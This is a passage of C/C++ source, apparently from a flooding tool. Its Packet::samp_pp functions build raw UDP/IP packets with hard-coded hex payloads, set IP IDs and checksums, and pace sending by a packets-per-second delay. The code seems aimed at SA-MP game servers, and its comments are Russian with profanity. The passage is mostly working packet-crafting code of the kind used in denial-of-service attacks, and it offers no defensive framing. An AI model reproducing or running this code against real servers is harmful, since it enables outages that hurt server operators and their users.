8\x00\x25\xc0\x1f\xe5\x80\x00\x04\x09\x94\xe8\x74\xdb\x34\x78\x8b\x0b\x28\xb8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x37\x00\x91\x17\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\xe0\x0f\x40\xe0\x00\x00\x86\x27\x58\x9e\x8c\xac\x68\x83\x44\xdf\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x38\x00\x91\x18\x00\x0c\x60\x20\x14\x2c\xc8\x00\x26\x00\x02\x63\xc0\x00\x0f\x8e\x65\x78\xaa\x8e\xdb\xb8\x88\xbd\xa1\x58\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x39\x00\x91\x18\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\x20\x1a\x26\x60\x00\x06\x91\xa7\x28\x96\xd6\xf1\x48\x98\xd0\x7d\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp7(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1d\x00\x48\x8c\x80\x06\x30\x10\x14\x2c\xc8\x00\x26\x40\x16\x87\x60\x00\x19\xde\xd7\x58\x99\x00\xff\x78\x84\x07\xec\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3b\x00\x91\x19\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\x60\x10\x43\x80\x00\x14\x67\xc1\x88\xae\x15\xc4\x68\x7d\x99\xa6\xf8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3c\x00\x91\x1a\x00\x0c\x60\x20\x14\x2c\xc8\x00\x26\x80\x04\x06\x60\x00\x1e\x5f\x58\xd8\x8a\x63\x41\xf8\xaf\x5c\x7f\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3d\x00\x91\x1a\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\xa0\x0a\x04\x40\x00\x1a\x7e\xc2\x68\xa7\xcc\x3a\x48\x91\xc0\x23\x38\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3e\x00\x91\x1b\x00\x0c\x60\x20\x14\x2c\xc8\x00\x26\xc0\x08\x82\x20\x00\x1b\x5b\x22\x38\xb3\x1f\x9b\x98\x70\x0c\x6a\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x3f\x00\x91\x1b\x80\x0c\x60\x20\x14\x2c\xc8\x00\x26\xe0\x0e\x84\x40\x00\x01\x82\xe2\xb8\x8d\x99\x61\xb8\x80\x50\xe0\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x40\x00\x91\x1c\x00\x0c\x60\x20\x14\x2c\xc8\x00\x27\x00\x1d\xa1\x80\x00\x09\xbf\x22\x88\xb4\x0c\xb3\x08\x42\x40\xfd\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x41\x00\x91\x1c\x80\x0c\x60\x20\x14\x2c\xc8\x00\x27\x20\x09\x83\x80\x00\x1f\x94\x96\x18\x8d\x18\x8f\x68\x81\xf5\x06\x18\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x42\x00\x91\x1d\x00\x0c\x60\x20\x14\x2c\xc8\x00\x27\x40\x0b\xe8\x80\x00\x07\xd0\x5b\x48\x90\x46\xb3\x78\x84\x13\x17\x98\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x43\x00\x91\x1d\x80\x0c\x60\x20\x14\x2c\xc8\x00\x27\x60\x17\x23\xe0\x00\x12\x09\x3d\x28\x70\x8b\x39\x58\x9d\x74\x00\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp8(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x22\x00\x48\x8f\x00\x06\x30\x10\x14\x2c\xc8\x00\x27\x80\x04\x03\x60\x00\x00\x9b\x6a\x88\x90\x01\x3b\xd8\x56\x8f\xe4\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x45\x00\x91\x1e\x80\x0c\x60\x20\x14\x2c\xc8\x00\x27\xa0\x17\x43\x00\x00\x0f\xa8\x80\x28\xac\x52\xe4\x18\xb1\x54\x92\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x46\x00\x91\x1f\x00\x0c\x60\x20\x14\x2c\xc8\x00\x27\xc0\x1c\x28\x80\x00\x05\x5b\x22\x98\xbe\xbe\x01\x28\xb6\xd8\x38\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x47\x00\x91\x1f\x80\x0c\x60\x20\x14\x2c\xc8\x00\x27\xe0\x0f\xa9\x20\x00\x14\x86\xa5\xe8\x96\x10\x24\x48\x9f\x8f\x80\x08\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x48\x00\x91\x20\x00\x0c\x60\x20\x14\x2c\xc8\x00\x28\x00\x0c\xa9\x40\x00\x05\x50\xc0\x98\xaa\x00\xea\x38\x82\x03\xa2\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x49\x00\x91\x20\x80\x0c\x60\x20\x14\x2c\xc8\x00\x28\x20\x07\x80\xe0\x00\x11\x03\xbc\x18\x7c\x01\x40\x48\x89\x6a\x14\x38\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x4a\x00\x91\x21\x00\x0c\x60\x20\x14\x2c\xc8\x00\x28\x40\x1b\x65\x00\x00\x0e\xde\x26\x18\xa7\xca\x55\x28\x83\xe6\x80\xa8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x4b\x00\x91\x21\x80\x0c\x60\x20\x14\x2c\xc8\x00\x28\x60\x1d\x60\x20\x00\x11\x4f\x78\x88\x9e\x70\x81\x08\xa2\xae\x65\x68\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x4c\x00\x91\x22\x00\x0c\x60\x20\x14\x2c\xc8\x00\x28\x80\x1b\xe8\x00\x00\x05\x75\xe0\x88\xa8\x02\x61\x08\x82\x0b\xb1\xa8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x4d\x00\x91\x22\x80\x0c\x60\x20\x14\x2c\xc8\x00\x28\xa0\x0e\xe2\x60\x00\x1a\xac\x23\xc8\xad\x06\xcc\xf8\x81\x5c\xb3\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp9(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x27\x00\x48\x91\x80\x06\x30\x10\x14\x2c\xc8\x00\x28\xc0\x14\x60\xc0\x00\x0c\x83\x0d\x28\x8b\xc6\x1b\x98\x9a\x18\xaf\x78\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x4f\x00\x91\x23\x80\x0c\x60\x20\x14\x2c\xc8\x00\x28\xe0\x09\x41\x60\x00\x08\x15\xdb\x68\x68\x94\xa7\x88\x85\x9f\x85\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x50\x00\x91\x24\x00\x0c\x60\x20\x14\x2c\xc8\x00\x29\x00\x02\x23\xc0\x00\x0d\x1c\xf6\x68\x71\x10\x84\xf8\xa0\x1b\xe3\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x51\x00\x91\x24\x80\x0c\x60\x20\x14\x2c\xc8\x00\x29\x20\x02\x62\xa0\x00\x11\xbd\x83\xb8\xb7\x60\x63\x68\xa3\x0f\x4c\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x52\x00\x91\x25\x00\x0c\x60\x20\x14\x2c\xc8\x00\x29\x40\x1b\x81\x00\x00\x03\x06\x7f\x58\x6c\xda\x93\x08\x9c\x28\x46\x88\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x53\x00\x91\x25\x80\x0c\x60\x20\x14\x2c\xc8\x00\x29\x60\x1b\x69\x20\x00\x11\x8c\x24\xd8\xab\x56\xf6\x08\x8b\x97\xc5\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x54\x00\x91\x26\x00\x0c\x60\x20\x14\x2c\xc8\x00\x29\x80\x01\x22\x20\x00\x14\x4a\x72\x98\x97\xce\xb4\xa8\x94\x32\xc3\x48\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x55\x00\x91\x26\x80\x0c\x60\x20\x14\x2c\xc8\x00\x29\xa0\x0a\xc3\x20\x00\x05\xfe\x9d\xd8\x9c\x19\x18\x38\x54\x05\x95\xd8\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x56\x00\x91\x27\x00\x0c\x60\x20\x14\x2c\xc8\x00\x29\xc0\x0c\xa0\x80\x00\x18\x00\x02\xf8\xb0\x47\x57\x48\x9c\x39\x84\xc8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x57\x00\x91\x27\x80\x0c\x60\x20\x14\x2c\xc8\x00\x29\xe0\x02\x02\x40\x00\x07\x11\xe5\xf8\x96\xda\xdd\x38\x93\xe8\x7a\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp10(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2c\x00\x48\x94\x00\x06\x30\x10\x14\x2c\xc8\x00\x2a\x00\x1e\x01\x00\x00\x00\x05\x6b\xc8\x42\x7f\x00\x68\xba\x5d\xd5\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x59\x00\x91\x28\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2a\x20\x0b\xe8\x80\x00\x19\x51\x0e\x58\x99\xc4\xbf\x98\x82\x12\xf7\x88\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x5a\x00\x91\x29\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2a\x40\x14\x64\x60\x00\x00\x03\xd6\x98\x03\x49\x65\xb8\xa7\x5f\x46\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x5b\x00\x91\x29\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2a\x60\x1d\x81\xa0\x00\x0f\x2d\x93\xd8\x88\x0c\xde\x68\x45\xa5\x64\x68\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x5c\x00\x91\x2a\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2a\x80\x16\x65\xa0\x00\x13\x1f\x2a\x58\x8a\x57\x4e\xf8\x89\x9c\x6c\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x5d\x00\x91\x2a\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2a\xa0\x0c\x82\xe0\x00\x19\x52\x21\x78\xa5\xfd\x65\x18\xbe\x03\x4d\x78\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x5e\x00\x91\x2b\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2a\xc0\x05\xc8\x20\x00\x00\x22\x20\x98\xbf\x13\x7c\x38\x7d\x6b\x83\xb8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x5f\x00\x91\x2b\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2a\xe0\x03\x83\x80\x00\x0f\x41\xd1\x68\x91\xd9\xd1\xe8\x89\xa8\x23\xb8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x60\x00\x91\x2c\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2b\x00\x1e\x28\xe0\x00\x11\x33\x05\xb8\xa6\xfd\x9c\x58\x8f\xab\x03\x68\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x61\x00\x91\x2c\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2b\x20\x15\x60\x20\x00\x12\x12\xd9\x68\x65\xbf\xe5\x48\xbb\x9d\x14\x58\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp11(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x31\x00\x48\x96\x80\x06\x30\x10\x14\x2c\xc8\x00\x2b\x40\x0b\x82\x60\x00\x16\xdb\x5d\x28\x9d\x1a\x71\x08\x7b\x38\x25\x78\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x63\x00\x91\x2d\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2b\x60\x0f\x20\x60\x00\x03\x65\x23\x28\xb9\x8f\x24\x68\x83\xc4\x1c\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x64\x00\x91\x2e\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2b\x80\x10\x69\x20\x00\x0f\x5c\xd7\x48\x85\xc1\x00\x18\xa9\xe0\xf4\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x65\x00\x91\x2e\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2b\xa0\x0d\x09\x40\x00\x0f\xe6\x50\x18\x94\x14\x59\xd8\x76\x87\xfd\xb8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x66\x00\x91\x2f\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2b\xc0\x1d\xe1\x00\x00\x06\x2d\x25\x08\xa3\x9b\xba\xd8\x99\x95\xc2\xf8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x67\x00\x91\x2f\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2b\xe0\x17\x42\xc0\x00\x03\x28\xe2\xc8\xbf\x99\xc0\x78\x91\x34\xe0\xe8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x68\x00\x91\x30\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2c\x00\x01\xa7\xe0\x00\x15\x25\xa3\xa8\xbb\xf3\xa1\x88\xb0\x1c\xc3\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x69\x00\x91\x30\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2c\x20\x17\x66\x20\x00\x19\x14\x44\xb8\xa7\xb3\x44\x08\xbb\x09\xfc\xc8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x6a\x00\x91\x31\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2c\x40\x1b\xe7\xc0\x00\x03\xef\x04\x28\xb0\x14\xa4\x38\x7b\xc3\x7c\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x6b\x00\x91\x31\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2c\x60\x17\x81\xc0\x00\x18\x5d\x58\xc8\x80\x11\xb4\xd8\x32\xe2\x81\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp12(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x36\x00\x48\x99\x00\x06\x30\x10\x14\x2c\xc8\x00\x2c\x80\x10\xe0\x80\x00\x08\x1f\x63\x98\xa4\x0e\xb0\x28\x6d\x9c\x4c\x58\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x6d\x00\x91\x32\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2c\xa0\x0c\xe6\x80\x00\x10\x0a\x97\x18\x3c\x01\x2c\xc8\x9d\xd8\xff\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x6e\x00\x91\x33\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2c\xc0\x00\xc3\x40\x00\x19\x97\xc1\x48\x88\xcb\xd0\xf8\x8b\xfc\xc4\x38\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x6f\x00\x91\x33\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2c\xe0\x12\x28\x00\x00\x14\x5f\xf9\xe8\x96\xfb\x60\xc8\xbd\xe1\xc3\xa8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x70\x00\x91\x34\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2d\x00\x01\x47\xe0\x00\x0a\xde\xc3\xf8\xb6\x28\xa5\x08\xa0\x16\x58\xf8\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x71\x00\x91\x34\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2d\x20\x0a\x47\xc0\x00\x10\x88\xe2\xd8\x92\x60\xc0\xf8\xbb\x2f\xa4\x48\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x72\x00\x91\x35\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2d\x40\x0a\x08\x80\x00\x1b\x50\x9d\xc8\x97\xca\x73\x98\x98\xce\x53\x28\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x73\x00\x91\x35\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2d\x60\x01\x26\x80\x00\x05\x8d\x01\x58\x8a\xd5\xb2\x68\x8e\xb1\xa0\x38\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x74\x00\x91\x36\x00\x0c\x60\x20\x14\x2c\xc8\x00\x2d\x80\x1b\x67\x40\x00\x09\xcd\x51\x38\x8e\x16\xc9\xc8\x90\x6d\x56\xb8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x75\x00\x91\x36\x80\x0c\x60\x20\x14\x2c\xc8\x00\x2d\xa0\x03\xe4\xa0\x00\x1f\xb7\x64\x58\xbe\x77\x60\xe8\xb5\xd9\x3b\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp13(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 295; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x78\x01\xc8\xba\x00\xcf\x60\x80\x14\x8b\xda\x61\x08\x00\x80\x38\x8d\x00\x00\x8c\x42\x41\xe0\x00\x00\x00\x00\x10\x10\x00\x00\x01\x50\x6b\x96\x3c\x13\xd0\x00\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x41\x4d\x04\xb5\x35\x40\x80\xc0\xb8\xcc\x81\x4d\x95\xc9\xd9\x95\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp14(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 337; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
